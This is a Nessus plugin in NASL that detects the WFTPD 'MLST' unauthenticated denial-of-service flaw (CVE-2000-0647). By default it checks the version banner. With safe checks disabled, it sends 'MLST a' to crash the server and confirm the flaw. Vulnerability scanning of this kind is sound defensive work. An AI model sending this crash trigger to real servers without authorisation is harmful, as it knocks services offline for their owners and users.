#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if(description)
{
 script_id(10487);
 script_version ("$Revision: 1.31 $");
 script_cvs_date("$Date: 2017/01/16 15:05:10 $");

 script_cve_id("CVE-2000-0647");
 script_bugtraq_id(1506);
 script_osvdb_id(386);
 script_xref(name:"EDB-ID", value:"20102");

 script_name(english:"WFTPD Unauthenticated MLST Command DoS");
 script_summary(english:"Crashes the remote FTP server.");

 script_set_attribute(attribute:"synopsis", value:
"The remote FTP server is affected by a denial of service
vulnerability.");
 script_set_attribute(attribute:"description", value:
"The FTP server running on the remote host is affected by a denial of
service vulnerability when executing an MLST command. An
unauthenticated, remote can exploit this to crash the server by using
the 'MLST a' command just after making a connection.");
 script_set_attribute(attribute:"see_also", value:"http://seclists.org/bugtraq/2000/Jul/295");
 script_set_attribute(attribute:"solution", value:
"If you are using the Texas Imperial Software WFTPD server, then
upgrade to version 2.41 RC12 or later. Otherwise, contact the vendor
for a fix.");
 script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:N/I:N/A:P");
 script_set_cvss_temporal_vector("CVSS2#E:POC/RL:OF/RC:C");
 script_set_cvss3_base_vector("CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H");
 script_set_cvss3_temporal_vector("CVSS:3.0/E:P/RL:O/RC:C");
 script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
 script_set_attribute(attribute:"exploit_available", value:"true");

 script_set_attribute(attribute:"vuln_publication_date", value: "2000/07/21");
 script_set_attribute(attribute:"plugin_publication_date", value: "2000/08/03");

 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_set_attribute(attribute:"cpe", value:"cpe:/a:texas_imperial_software:wftpd");
 script_end_attributes();

 script_category(ACT_MIXED_ATTACK);
 script_family(english:"FTP");

 script_copyright(english:"This script is Copyright (C) 2000-2017 Tenable Network Security, Inc.");

 script_dependencie("ftp_anonymous.nasl", "ftpserver_detect_type_nd_version.nasl");
 script_require_ports("Services/ftp", 21);

 exit(0);
}

#
# The script code starts here
#
include("global_settings.inc");
include("misc_func.inc");
include("audit.inc");
include("ftp_func.inc");

port = get_ftp_port(default: 21);
banner = get_ftp_banner(port: port);
if (! banner) audit(AUDIT_NO_BANNER, port);
if ("WFTPD" >!< banner) audit(AUDIT_NOT_LISTEN, "WFTPD", port);

version = NULL;

foreach line (split(banner))
{
  matches = eregmatch(pattern:"WFTPD? ([0-9\.]*)", string:line);
  if (matches && matches[1])
  {
    version = matches[1];
    break;
  }
}
if (empty_or_null(version))
  audit(AUDIT_SERVICE_VER_FAIL, "WFTPD", port);

min = "2.0.0";

# The RC version does not appear to be available from the banner
#  Try next best version and use safe checks to confirm
fix = "2.4.2";
flag = FALSE;

if (version =~ "^2\." && ver_compare(ver:version, fix:fix, minver:min, strict:FALSE) <  0)
{
  if(safe_checks())
  {
  report = "Version : " + version;
  report += '\nNessus reports this vulnerability using only information gathered';
  report += '\nvia the banner. Use caution when testing without safe checks enabled.\n';
   security_report_v4(port:port, severity:SECURITY_WARNING, extra:report);
  }
  else
  {

    soc = open_sock_tcp(port);
    if (! soc) audit(AUDIT_SOCK_FAIL, port);

    r = ftp_recv_line(socket:soc);
    if (! r) audit(AUDIT_NO_BANNER, port);

    send(socket:soc, data: 'MLST a\r\n');
    r = ftp_recv_line(socket:soc);
    close(soc);

    for (i = 0; i < 3 && ! soc2; i ++)
    {
     sleep(i);
     soc2 = open_sock_tcp(port);
    }
    if(!soc2) flag = TRUE;
    else
    {
      r = ftp_recv_line(socket:soc2, retry: 3);
      if(!r) flag = TRUE;
    }
    close(soc2);
    if (flag) security_report_v4(port:port, severity:SECURITY_WARNING, extra:report);

  }
}
else
  audit(AUDIT_INST_VER_NOT_VULN, "WFTPD");

